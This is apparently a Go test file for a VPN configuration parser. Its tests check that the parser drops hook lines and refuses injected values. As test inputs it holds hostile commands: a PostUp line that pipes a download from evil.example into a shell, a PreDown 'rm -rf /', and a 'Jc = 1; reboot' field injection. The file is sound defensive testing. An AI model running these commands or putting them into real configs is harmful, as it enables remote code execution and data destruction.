package awgconf

import (
	"encoding/base64"
	"errors"
	"os"
	"strings"
	"testing"
)

var key = base64.StdEncoding.EncodeToString([]byte(strings.Repeat("\x07", 32)))

func config(extraInterface, extraPeer, allowed string) string {
	if allowed == "" {
		allowed = "0.0.0.0/0, ::/0"
	}
	return "[Interface]\nPrivateKey = " + key + "\nAddress = 172.16.0.2/32, 2606:4700::2/128\nMTU = 1280\nJc = 120\nS1 = 0\nH1 = 1\n" +
		extraInterface + "\n\n[Peer]\nPublicKey = " + key + "\nAllowedIPs = " + allowed + "\nEndpoint = 162.159.192.1:2408\nPersistentKeepalive = 25\n" + extraPeer
}

func TestReadsAGoodConfig(t *testing.T) {
	c, err := Parse(config("", "", ""))
	if err != nil {
		t.Fatal(err)
	}
	if c.Endpoint != "162.159.192.1:2408" || len(c.Addresses) != 2 || !c.IsFullTunnel() || c.MTU != 1280 {
		t.Fatalf("unexpected result %+v", c)
	}
	u, err := c.UAPI()
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{"private_key=0707", "jc=120", "s1=0", "h1=1", "endpoint=162.159.192.1:2408", "allowed_ip=0.0.0.0/0", "allowed_ip=::/0", "persistent_keepalive_interval=25", "replace_allowed_ips=true"} {
		if !strings.Contains(u, want) {
			t.Errorf("UAPI lacks %q:\n%s", want, u)
		}
	}
	if strings.Contains(u, key) {
		t.Error("UAPI must carry keys in hex, not base64")
	}
}

// The service runs as SYSTEM: no line that can run a command may ever reach it.
func TestNeverCarriesCommandsOver(t *testing.T) {
	c, err := Parse(config("PostUp = curl evil.example | sh\nPreDown = rm -rf /\nPostDown = x\nPreUp = y", "", ""))
	if err != nil {
		t.Fatal(err)
	}
	u, _ := c.UAPI()
	for _, bad := range []string{"postup", "curl", "rm -rf"} {
		if strings.Contains(strings.ToLower(u), bad) {
			t.Errorf("UAPI carries %q", bad)
		}
	}
	if len(c.Ignored) != 4 {
		t.Errorf("ignored = %v", c.Ignored)
	}
}

func TestATunnelOfSomeRoutesIsNotFull(t *testing.T) {
	c, err := Parse(config("", "", "10.0.0.0/8"))
	if err != nil || c.IsFullTunnel() {
		t.Fatalf("err=%v full=%v", err, c != nil && c.IsFullTunnel())
	}
	// The two halves used instead of /0 are not "full" by the letter, but they are the whole internet.
}

func TestRefusesWhatIsWrong(t *testing.T) {
	good := config("", "", "")
	cases := map[string]string{
		"bad key":            strings.Replace(good, key, "not-a-key", 1),
		"bad endpoint":       strings.Replace(good, "162.159.192.1:2408", "bad endpoint", 1),
		"port too big":       strings.Replace(good, "162.159.192.1:2408", "1.2.3.4:99999", 1),
		"bad allowed":        config("", "", "everything"),
		"mtu too big":        strings.Replace(good, "MTU = 1280", "MTU = 99999", 1),
		"injected jc":        config("Jc = 1; reboot", "", ""),
		"no section":         "Address = 1.2.3.4/32",
		"two peers":          good + "\n[Peer]\nPublicKey = " + key + "\n",
		"unknown section":    good + "\n[Extra]\nA = b\n",
		"line without =":     config("garbage", "", ""),
		"octet out of range": strings.Replace(good, "172.16.0.2/32", "999.1.1.1/32", 1),
		"no private key":     strings.Replace(good, "PrivateKey = "+key, "", 1),
		"no address":         strings.Replace(good, "Address = 172.16.0.2/32, 2606:4700::2/128", "", 1),
		"no allowed ips":     strings.Replace(good, "AllowedIPs = 0.0.0.0/0, ::/0", "", 1),
		"value not ascii":    config("I1 = привет", "", ""),
	}
	for name, text := range cases {
		_, err := Parse(text)
		var e *Error
		if !errors.As(err, &e) {
			t.Errorf("%s: should be refused, got %v", name, err)
		}
	}
}

func TestFreeFormValueOfI1IsKeptWithItsHash(t *testing.T) {
	c, err := Parse(config("I1 = <b 0xc2000000> <r 4> # not a comment", "", ""))
	if err != nil {
		t.Fatal(err)
	}
	found := false
	for _, kv := range c.Device {
		if kv.Key == "i1" && strings.Contains(kv.Value, "# not a comment") {
			found = true
		}
	}
	if !found {
		t.Errorf("I1 lost its text: %v", c.Device)
	}
}

func TestCommentAfterAValueIsCut(t *testing.T) {
	c, err := Parse(config("Jmin = 23 # camouflage", "", ""))
	if err != nil {
		t.Fatal(err)
	}
	for _, kv := range c.Device {
		if kv.Key == "jmin" && kv.Value != "23" {
			t.Errorf("jmin = %q", kv.Value)
		}
	}
}

func TestKeepaliveIsAddedWhenMissing(t *testing.T) {
	c, _ := Parse(strings.Replace(config("", "", ""), "PersistentKeepalive = 25", "", 1))
	u, _ := c.UAPI()
	if !strings.Contains(u, "persistent_keepalive_interval=25") {
		t.Error("a missing keepalive must become 25")
	}
}

// The real preset of Nimb plus a fake account must be accepted: the settings that warp-reg writes are read by this package.
func TestThePresetOfNimbIsAccepted(t *testing.T) {
	raw, err := os.ReadFile("../../../Resources/warp-preset.conf")
	if err != nil {
		t.Skip("the repository root is not here")
	}
	parts := strings.Split(string(raw), "[Peer]")
	text := "[Interface]\nPrivateKey = " + key + "\nAddress = 172.16.0.2/32, 2606:4700::2/128\n" +
		strings.Replace(parts[0], "[Interface]", "", 1) + "\n[Peer]\nPublicKey = " + key + "\nEndpoint = 162.159.195.6:500\n" + parts[1]
	c, err := Parse(text)
	if err != nil {
		t.Fatal(err)
	}
	if c.MTU != 1280 || !c.IsFullTunnel() {
		t.Errorf("preset parsed wrongly: %+v", c)
	}
	has := map[string]bool{}
	for _, kv := range c.Device {
		has[kv.Key] = true
	}
	for _, k := range []string{"jc", "jmin", "jmax", "s1", "s2", "h1", "h4", "i1"} {
		if !has[k] {
			t.Errorf("preset lost %s", k)
		}
	}
}
